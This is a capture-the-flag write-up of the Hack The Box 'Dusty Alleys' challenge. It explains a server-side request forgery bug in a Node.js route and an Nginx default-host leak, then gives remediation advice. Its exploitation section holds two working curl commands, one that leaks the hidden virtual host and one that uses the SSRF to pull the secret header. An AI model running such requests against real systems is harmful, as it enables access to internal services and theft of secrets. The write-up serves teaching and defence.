# Hack The Box: Dusty Alleys (Medium)

## Summary

This write-up details the discovery and exploitation of a Server-Side Request Forgery (SSRF) vulnerability in the "Dusty Alleys" web challenge on Hack The Box. The bug was caused by insecure handling of user-supplied input passed to a server-side HTTP fetch function. Additionally, Nginx misconfiguration and an information-leaking endpoint enabled virtual host discovery, which was crucial for exploiting the SSRF.

---

## Target

```
http://94.237.59.38:52577
```

---

## Bug Type: Server-Side Request Forgery (SSRF)

---

## Vulnerable Route: `/guardian`

### Vulnerability Classification

* CWE-918: Server-Side Request Forgery (SSRF)

---

## Root Cause Analysis

The application is built using **Node.js** and the **Express** framework. Below is the relevant vulnerable source code:

### `guardian.js`

```js
const node_fetch = require("node-fetch");
const router = require("express").Router();

router.get("/guardian", async (req, res) => {
  const quote = req.query.quote;

  if (!quote) return res.render("guardian");

  try {
    const location = new URL(quote);
    const direction = location.hostname;
    if (!direction.endsWith("localhost") && direction !== "localhost")
      return res.send("guardian", {
        error: "You are forbidden from talking with me.",
      });
  } catch (error) {
    return res.render("guardian", { error: "My brain circuits are mad." });
  }

  try {
    let result = await node_fetch(quote, {
      method: "GET",
      headers: { Key: process.env.FLAG || "HTB{REDACTED}" },
    }).then((res) => res.text());

    res.set("Content-Type", "text/plain");
    res.send(result);
  } catch (e) {
    return res.render("guardian", {
      error: "The words are lost in my circuits",
    });
  }
});
```

### Why This Is SSRF (and Not XSS)

* The user input (`req.query.quote`) is passed directly into a **server-side `node_fetch()` call**.
* This results in the **server making a request** to whatever URL the user provides.
* The response is then **returned directly to the user**, potentially exposing internal services.

This is a **classic SSRF pattern**.

#### Not XSS because:

* There is no rendering of input into an HTML/JS context.
* No reflection of user input into a web page.
* The only use of user input is in a backend HTTP request.
* Additionally, no user input is enclosed inside script tags or used in the DOM, which would be required for Cross-Site Scripting (XSS) to be exploitable.

---

## Server Configuration Analysis

The `default.conf` Nginx config:

```nginx
server {
    listen 80 default_server;
    server_name alley.$SECRET_ALLEY;

    location /think {
        proxy_pass http://localhost:1337;
    }
}

server {
    listen 80;
    server_name guardian.$SECRET_ALLEY;

    location /guardian {
        proxy_pass http://localhost:1337;
    }
}
```

### Exploitable Behavior

* The Nginx `default_server` handles requests **with no Host header**.
* `/think` route **returns request headers** — a potential info leak.

---

## Exploitation Steps

### Step 1: Leak the SECRET\_ALLEY using HTTP/1.0 request

```bash
curl -H "Host:" --http1.0 http://94.237.59.38:52577/think
```

#### Response:

```json
{
  "host": "alley.firstalleyontheleft.com",
  ...
}
```

### Step 2: Exploit SSRF with virtual host

```bash
curl -H "Host: guardian.firstalleyontheleft.com" \
"http://94.237.59.38:52577/guardian?quote=http://localhost:1337/think"
```

#### Response:

```json
{
  "key": "HTB{dusty_alley_flag}",
  ...
}
```

---

## Impact

* Access to internal service running on `localhost`
* Exfiltration of sensitive internal headers (`Key: FLAG`)
* Could be escalated further in real-world apps (e.g., metadata API, Redis, etc.)

---

## Remediation

* Never pass user input directly into fetch/curl without strict validation
* Avoid sending sensitive data (like secrets) in headers based on user input
* Restrict internal-only fetchers using allow-lists
* Remove default Nginx virtual hosts or separate public and internal interfaces



---

## Tags

`SSRF` `Nginx` `Bug Bounty` `CTF` `HackTheBox` `node-fetch` `Header Injection` `Virtual Host` `Internal Service`
